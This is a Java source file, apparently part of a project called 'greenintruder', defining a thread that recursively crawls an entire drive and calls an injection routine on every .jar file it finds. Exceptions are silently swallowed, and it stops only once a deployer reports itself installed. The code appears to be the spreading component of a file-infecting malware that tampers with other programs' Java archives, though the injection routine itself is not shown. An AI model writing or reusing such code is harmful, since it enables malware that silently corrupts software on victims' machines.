package io.github.explodingbottle.greenintruder.certifier.admintools;

import java.io.File;
import java.nio.file.Path;

public class InjectionThread extends Thread {
	private File drive;
	private boolean underAdmin;

	public InjectionThread(File drive, boolean underAdmin) {
		this.drive = drive;
		this.underAdmin = underAdmin;
	}

	private boolean shouldExit() {
		return !underAdmin && DeployerTool.isFileInstalled();
	}

	private void recursive(Path path) {
		if (shouldExit())
			return;
		File[] fileList = path.toFile().listFiles();
		if (fileList != null) {
			for (File file : fileList) {
				if (shouldExit())
					return;
				Path pathVal = file.toPath();
				if (file.isDirectory()) {
					recursive(pathVal);
				} else {
					if (pathVal.toFile().getName().toLowerCase().endsWith(".jar")) {
						if (shouldExit())
							return;
						InjectionTool.injectInJar(pathVal.toFile());
					} else {

					}
				}
			}
		}
	}

	public void run() {
		try {
			recursive(drive.toPath());
		} catch (Exception e) {

		}

	}

}
